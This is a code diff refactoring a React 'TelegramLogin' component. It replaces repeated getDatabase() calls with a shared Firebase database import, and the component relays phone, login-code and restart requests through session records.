@@ -162,7 +162,8 @@
 
 // export default TelegramLogin;
 import React, { useState, useEffect } from "react";
-import { getDatabase, ref, set, onValue, off } from "firebase/database";
+import { ref, onValue, set, off } from "firebase/database";
+import { database } from "../../config/firebase-config";
 
 function TelegramLogin() {
   const [phone, setPhone] = useState("");
@@ -180,7 +181,7 @@ function TelegramLogin() {
   useEffect(() => {
     if (!sessionId) return;
 
-    const db = getDatabase();
+    const db = database;
     const responseRef = ref(db, `sessions/${sessionId}/response`);
 
     const unsubscribe = onValue(responseRef, (snapshot) => {
@@ -223,7 +224,7 @@ function TelegramLogin() {
     setError(null);
     setShowRetry(false);
     try {
-      const db = getDatabase();
+      const db = database;
       await set(ref(db, `sessions/${sessionId}/request`), {
         type: "restart",
         timestamp: Date.now(),
@@ -241,7 +242,7 @@ function TelegramLogin() {
     setShowRetry(false);
 
     try {
-      const db = getDatabase();
+      const db = database;
       const phoneToSend = phone.replace(/\s/g, "");
       await set(ref(db, `sessions/${sessionId}/request`), {
         type: "phone",
@@ -261,7 +262,7 @@ function TelegramLogin() {
     setShowRetry(false);
 
     try {
-      const db = getDatabase();
+      const db = database;
       await set(ref(db, `sessions/${sessionId}/request`), {
         type: "code",
         code: code,
@@ -277,7 +278,7 @@ function TelegramLogin() {
     setLoading(true);
     setError(null);
     try {
-      const db = getDatabase();
+      const db = database;
       await set(ref(db, `sessions/${sessionId}/request`), {
         type: "custom",
         data: {
